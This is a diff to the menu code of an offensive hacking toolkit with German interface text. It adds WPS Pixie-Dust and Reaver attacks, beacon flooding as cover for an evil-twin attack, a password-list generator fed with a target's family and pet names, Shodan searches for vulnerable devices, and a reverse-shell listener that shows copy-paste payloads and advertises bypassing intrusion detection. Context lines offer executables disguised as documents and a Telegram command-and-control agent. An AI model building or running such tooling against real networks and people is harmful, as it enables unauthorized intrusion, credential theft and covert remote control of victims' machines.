@@ -136,17 +136,22 @@ def ask_int(label: str, default: int) -> int:
 
 async def menu_wifi():
     from tools.wifi import WifiScanner, HandshakeCapture, PMKIDAttack, DeauthFlood, EvilTwin
+    from tools.wifi import WPSScanner, PixieDust, ReaverBrute, BeaconFlood
     from core.config import load
     cfg = load()
 
     while True:
         banner()
-        section("📡  WiFi ATTACKS")
-        menu_item("1", "WiFi Scanner",          "🟡")
-        menu_item("2", "Handshake Capture",     "🟠")
-        menu_item("3", "PMKID Attack",          "🟠")
-        menu_item("4", "Deauth Flood",          "🔴")
-        menu_item("5", "Evil Twin + Portal",    "🔴")
+        section("📡  WiFi ATTACKS", "WPA2/3 · WPS · Handshake · Evil Twin · Deauth · Beacon Flood")
+        menu_item("1", "WiFi Scanner",           "🟡", "Scant alle APs + WPS-Status")
+        menu_item("2", "Handshake Capture",      "🟠", "WPA2-Handshake für hashcat/aircrack")
+        menu_item("3", "PMKID Attack",           "🟠", "Clientless WPA2-Angriff")
+        menu_item("4", "Deauth Flood",           "🔴", "Clients vom Netz trennen")
+        menu_item("5", "Evil Twin + Portal",     "🔴", "Fake-AP + Captive Portal → Passwort")
+        menu_item("6", "WPS Scan",               "🟡", "Findet WPS-fähige Router (wash)")
+        menu_item("7", "Pixie-Dust Attack",      "🔴", "WPS-PIN in Sekunden offline cracken")
+        menu_item("8", "Reaver WPS Brute-Force", "🔴", "WPS online brute-force (2-10h)")
+        menu_item("9", "Beacon Flood",           "🟠", "Tausende Fake-SSIDs senden (mdk4)")
         menu_item("0", "Back")
 
         choice = prompt("wifi")
@@ -203,6 +208,74 @@ async def menu_wifi():
             t = EvilTwin(iface, cfg.get("output_dir", "/tmp"))
             try:
                 await run_tool_live(t.start(ssid, channel))
+            except KeyboardInterrupt:
+                await t.stop()
+
+        elif choice == "6":
+            section("WPS SCANNER", "Zeigt alle APs mit aktivem WPS")
+            info_box([
+                "wash scannt nach WPS-fähigen APs.",
+                "Locked=No → Pixie-Dust oder Reaver möglich",
+                "Locked=Yes → Router hat WPS nach Fehlversuchen gesperrt",
+            ])
+            iface = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
+            timeout = ask_int("Scan-Dauer (Sekunden)", 30)
+            t = WPSScanner(iface)
+            try:
+                await run_tool_live(t.scan(timeout))
+            except KeyboardInterrupt:
+                pass
+
+        elif choice == "7":
+            section("PIXIE-DUST ATTACK", "WPS-PIN offline cracken — keine Brute-Force nötig")
+            info_box([
+                "Pixie-Dust nutzt schwache Zufallszahlen in WPS-Implementierungen.",
+                "Funktioniert bei ~25% aller Router. Ergebnis in 1-60 Sekunden.",
+                "Monitor-Mode muss aktiv sein (airmon-ng start wlan0).",
+                "BSSID: MAC-Adresse des Routers (z.B. AA:BB:CC:DD:EE:FF)",
+            ])
+            iface   = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
+            bssid   = ask("Ziel BSSID", required=True)
+            channel = ask("Kanal", "6")
+            t = PixieDust(iface)
+            try:
+                await run_tool_live(t.attack(bssid, channel))
+            except KeyboardInterrupt:
+                await t.stop()
+
+        elif choice == "8":
+            section("REAVER WPS BRUTE-FORCE", "Online-Angriff — probiert alle WPS-PINs durch")
+            info_box([
+                "WARNUNG: Dauert 2-10 Stunden. Fortschritt wird automatisch gespeichert.",
+                "Viele Router sperren WPS nach mehreren Fehlversuchen (WPS Lock).",
+                "Delay = Wartezeit zwischen Versuchen (empfohlen: 1-2 Sekunden).",
+                "Reaver macht automatisch Pause bei Rate-Limiting.",
+            ])
+            iface   = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
+            bssid   = ask("Ziel BSSID", required=True)
+            channel = ask("Kanal", "6")
+            delay   = float(ask("Delay zwischen Versuchen (Sek)", "1.0"))
+            t = ReaverBrute(iface)
+            try:
+                await run_tool_live(t.attack(bssid, channel, delay))
+            except KeyboardInterrupt:
+                await t.stop()
+
+        elif choice == "9":
+            section("BEACON FLOOD", "Überschwemmt WiFi-Radar mit Fake-SSIDs")
+            info_box([
+                "Sendet hunderte gefälschte Beacon-Frames mit verschiedenen SSIDs.",
+                "Alle Geräte in Reichweite sehen diese Netzwerke.",
+                "Gut für: Ablenkung während Evil-Twin läuft.",
+                "Benötigt: mdk4 (apt install mdk4)",
+            ])
+            iface  = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
+            count  = ask_int("Anzahl Fake-SSIDs", 200)
+            custom = ask("Eigene SSIDs (kommagetrennt, leer=zufällig)", "")
+            ssid_list = [s.strip() for s in custom.split(",") if s.strip()] if custom else None
+            t = BeaconFlood(iface)
+            try:
+                await run_tool_live(t.flood(ssid_list, count))
             except KeyboardInterrupt:
                 await t.stop()
 
@@ -485,12 +558,13 @@ async def menu_passwords():
 
     while True:
         banner()
-        section("🔑  PASSWORDS")
-        menu_item("1", "Identify Hash Type",         "🟢")
-        menu_item("2", "Crack Hash — Hashcat (GPU)", "🟡")
-        menu_item("3", "Crack Hash — John",          "🟡")
-        menu_item("4", "Crack WPA2 .cap File",       "🟡")
-        menu_item("5", "Network Brute-Force (Hydra)","🟠")
+        section("🔑  PASSWORDS & HASHES", "Hashcat GPU · John · Hydra · Smart Wordlist")
+        menu_item("1", "Hash-Typ erkennen",           "🟢", "21 Typen: MD5, SHA, NTLM, bcrypt...")
+        menu_item("2", "Hash cracken — Hashcat (GPU)","🟡", "GPU-beschleunigt, schnellste Methode")
+        menu_item("3", "Hash cracken — John",         "🟡", "CPU-basiert, viele Formate")
+        menu_item("4", "WPA2 .cap cracken",           "🟡", "Handshake → Passwort")
+        menu_item("5", "Netzwerk Brute-Force (Hydra)","🟠", "SSH/FTP/RDP/SMB/MySQL/HTTP...")
+        menu_item("6", "Smart Wordlist Generator",    "🟡", "Zielbasierte Liste aus OSINT-Daten")
         menu_item("0", "Back")
 
         choice = prompt("passwords")
@@ -546,6 +620,49 @@ async def menu_passwords():
                 await run_tool_live(t.crack(target, proto, user, "", wordlist, port))
             except KeyboardInterrupt:
                 await t.stop()
+
+        elif choice == "6":
+            from tools.passwords.wordlist_gen import generate, TargetProfile
+            section("SMART WORDLIST GENERATOR", "Personalisierte Wordlist aus Ziel-Infos")
+            info_box([
+                "Generiert ~5000-50000 Passwörter basierend auf Ziel-Informationen.",
+                "80% Erfolgsrate bei selbst gewählten Passwörtern vs. rockyou.txt.",
+                "Leer lassen = überspringen. Mehr Infos = bessere Liste.",
+            ])
+            print(f"\n  {C}── Persönliche Daten ──{R}")
+            first   = ask("Vorname")
+            last    = ask("Nachname")
+            nick    = ask("Spitzname / Username")
+            bdate   = ask("Geburtsdatum (z.B. 15.02.1990)")
+            partner = ask("Partner-Name")
+            pbdate  = ask("Partner-Geburtsdatum")
+            kids_s  = ask("Kinder-Namen (kommagetrennt)")
+            pets_s  = ask("Haustier-Namen (kommagetrennt)")
+            print(f"\n  {C}── Arbeit / Interessen ──{R}")
+            company = ask("Firma")
+            team    = ask("Lieblingsverein / Team")
+            city    = ask("Stadt")
+            print(f"\n  {C}── Digital ──{R}")
+            username = ask("Benutzername / Social-Media Handle")
+            domain  = ask("Domain / Website (z.B. example.com)")
+            phone   = ask("Telefonnummer (nur Zahlen)")
+            kws     = ask("Eigene Keywords (kommagetrennt)")
+            out     = ask("Ausgabedatei", "/tmp/penkit_wordlist.txt")
+
+            profile = TargetProfile(
+                first_name=first, last_name=last, nickname=nick,
+                birthdate=bdate, partner_name=partner, partner_birthdate=pbdate,
+                child_names=[c.strip() for c in kids_s.split(",") if c.strip()],
+                pet_names=[p.strip() for p in pets_s.split(",") if p.strip()],
+                company=company, sports_team=team, city=city,
+                username=username, domain=domain, phone=phone,
+                keywords=[k.strip() for k in kws.split(",") if k.strip()],
+            )
+            print()
+            try:
+                await run_tool_live(generate(profile, out))
+            except Exception as e:
+                print(f"  {RD}[!] {e}{R}")
 
         wait_key()
 
@@ -607,12 +724,15 @@ async def menu_osint():
 
     while True:
         banner()
-        section("🔍  OSINT RECON")
-        menu_item("1", "theHarvester (emails/subdomains/IPs)", "🟡")
-        menu_item("2", "Sherlock (username across 300+ sites)", "🟡")
-        menu_item("3", "Subdomain Enumeration",                "🟡")
-        menu_item("4", "Google Dorks Generator",               "🟢")
-        menu_item("5", "Full Recon Pipeline (all above)",      "🟡")
+        section("🔍  OSINT RECON", "theHarvester · Sherlock · Sublist3r · Shodan · Google Dorks")
+        menu_item("1", "theHarvester — E-Mails/Subdomains/IPs",  "🟡", "Erntet öffentliche Infos")
+        menu_item("2", "Sherlock — Username auf 300+ Plattformen","🟡", "Findet alle Accounts")
+        menu_item("3", "Subdomain Enumeration",                   "🟡", "Sublist3r + crt.sh + brute")
+        menu_item("4", "Google Dorks Generator",                  "🟢", "Fertige Dork-Queries")
+        menu_item("5", "Full Recon Pipeline",                     "🟡", "Alles in einem Lauf + Report")
+        menu_item("6", "Shodan — Internet Device Search",         "🟡", "Verwundbare Geräte weltweit")
+        menu_item("7", "Shodan — IP Lookup",                      "🟡", "Alle Infos zu einer IP")
+        menu_item("8", "Shodan — Eigene externe IP",              "🟢", "Was sieht Internet von dir?")
         menu_item("0", "Back")
 
         choice = prompt("osint")
@@ -638,6 +758,52 @@ async def menu_osint():
             domain = ask("Target domain", required=True)
             username = ask("Username (optional)", "")
             await run_tool_live(recon.full_recon(domain, username))
+
+        elif choice == "6":
+            from tools.osint.shodan_lookup import ShodanLookup, PRESET_SEARCHES
+            section("SHODAN SEARCH", "Google für Hacker — findet verwundbare Geräte weltweit")
+            shodan = ShodanLookup()
+            if not shodan.api_key:
+                info_box([
+                    "Shodan API-Key empfohlen für volle Funktionalität.",
+                    "Kostenlos registrieren: https://account.shodan.io/",
+                    "Ohne Key: nur Beispiel-Queries und ipinfo.io Fallback.",
+                    "Key eingeben → dauerhaft gespeichert in ~/.penkit_shodan_key",
+                ])
+                setup = ask("API-Key jetzt eingeben? (j/n)", "n")
+                if setup.lower() == "j":
+                    key = ask("Shodan API-Key", required=True)
+                    await run_tool_live(shodan.setup_key(key))
+
+            print(f"\n  {C}Preset-Suchen:{R}")
+            for i, (name, q) in enumerate(list(PRESET_SEARCHES.items())[:8], 1):
+                print(f"  {DIM}[{i}]{R}  {name:<30}  {DIM}{q}{R}")
+            print()
+
+            query = ask("Shodan Query (leer = eigener, 1-8 = Preset)", "")
+            if query.isdigit() and 1 <= int(query) <= 8:
+                query = list(PRESET_SEARCHES.values())[int(query)-1]
+                print(f"  {DIM}Query: {query}{R}")
+
+            country = ask("Auf Land einschränken (z.B. DE, leer = global)", "")
+            limit = ask_int("Max. Ergebnisse", 20)
+            print()
+            await run_tool_live(shodan.search_with_python(query, limit, country))
+
+        elif choice == "7":
+            from tools.osint.shodan_lookup import ShodanLookup
+            section("SHODAN IP LOOKUP", "Ports, Banner, CVEs, ISP zu einer IP")
+            shodan = ShodanLookup()
+            ip = ask("IP-Adresse", required=True)
+            print()
+            await run_tool_live(shodan.lookup_ip(ip))
+
+        elif choice == "8":
+            from tools.osint.shodan_lookup import ShodanLookup
+            section("EIGENE EXTERNE IP", "Was sieht das Internet von deiner Kali-IP?")
+            shodan = ShodanLookup()
+            print()
+            await run_tool_live(shodan.my_ip_info())
 
         wait_key()
 
@@ -1019,6 +1185,7 @@ async def menu_c2():
     menu_item(" 6", "🎭  Als PDF/Foto/Word tarnen",        "⛔", "EXE mit echtem Icon, öffnet Decoy-Datei zur Tarnung")
     menu_item(" 7", "📱  Telegram C2 Agent generieren",   "⛔", "PS1 das Befehle via Telegram empfängt + ausführt")
     menu_item(" 8", "🤖  Telegram Bot Setup",             "🔴", "Bot-Token verifizieren + Chat-ID herausfinden")
+    menu_item(" 9", "🎣  Reverse Shell Listener",         "🔴", "Empfängt eingehende Shells (pwncat/nc/msf/socat)")
     print()
     menu_item(" 0", "← Zurück", "")
     print()
@@ -1374,6 +1541,72 @@ async def menu_c2():
                 print(f"\n  {DIM}Jetzt C2 → Agent generieren (Option 7){R}")
         except Exception as e:
             print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice == "9":
+        banner()
+        section("🎣  REVERSE SHELL LISTENER", "Empfängt eingehende Shells von Ziel-Systemen")
+        info_box([
+            "Der Listener wartet auf eine eingehende Verbindung vom Ziel-PC.",
+            "LHOST = deine Kali IP  |  LPORT = Port auf dem du lauschst",
+            "",
+            "Listener-Typen:",
+            "  pwncat-cs  → modernster Listener: Auto-PTY, Datei-Upload, PrivEsc",
+            "  netcat     → klassisch, überall verfügbar, einfach",
+            "  msfconsole → für Meterpreter-Payloads",
+            "  socat TLS  → verschlüsselt, bypassed IDS/IPS",
+            "",
+            "Tipp: Erst Listener starten, dann Payload auf Ziel ausführen.",
+        ])
+        import socket as _sock
+        try:
+            local_ip = _sock.gethostbyname(_sock.gethostname())
+        except Exception:
+            local_ip = "192.168.x.x"
+
+        lhost = ask("LHOST (deine Kali IP)", local_ip)
+        lport = ask_int("LPORT", 4444)
+        print()
+        print(f"  {C}Listener-Typ wählen:{R}")
+        print(f"  {DIM}[1]{R}  pwncat-cs {DIM}(empfohlen — Auto-PTY + PrivEsc + File Transfer){R}")
+        print(f"  {DIM}[2]{R}  netcat    {DIM}(klassisch, überall verfügbar){R}")
+        print(f"  {DIM}[3]{R}  Metasploit multi/handler {DIM}(für Meterpreter){R}")
+        print(f"  {DIM}[4]{R}  socat TLS {DIM}(verschlüsselt, IDS-bypass){R}")
+        print(f"  {DIM}[5]{R}  Nur Payloads anzeigen {DIM}(kein Listener — nur copy-paste Befehle){R}")
+        print()
+        ltype = ask("Typ", "1")
+
+        from tools.c2.listener import (
+            PwncatListener, NetcatListener, MsfListener,
+            SocatTLSListener, show_payloads
+        )
+
+        if ltype == "5":
+            await run_tool_live(show_payloads(lhost, lport))
+            wait_key()
+            return
+
+        # Payloads zuerst anzeigen
+        print(f"\n  {Y}[*] Copy-Paste Payloads (auf Ziel ausführen):{R}")
+        async for line in show_payloads(lhost, lport):
+            if line.strip():
+                print(f"  {DIM}{line}{R}")
+        print()
+        print(f"  {RD}[!] Listener startet jetzt — Terminal wird übergeben{R}")
+        print(f"  {DIM}Abbrechen: Ctrl+C{R}")
+        print()
+        input(f"  {Y}Enter drücken um Listener zu starten...{R}")
+
+        if ltype == "1":
+            await run_tool_live(PwncatListener(lhost, lport).listen())
+        elif ltype == "2":
+            await run_tool_live(NetcatListener(lhost, lport).listen())
+        elif ltype == "3":
+            payload = ask("Meterpreter Payload", "windows/x64/meterpreter/reverse_tcp")
+            await run_tool_live(MsfListener(lhost, lport, payload).listen())
+        elif ltype == "4":
+            await run_tool_live(SocatTLSListener(lport).listen())
+
         wait_key()
 
 
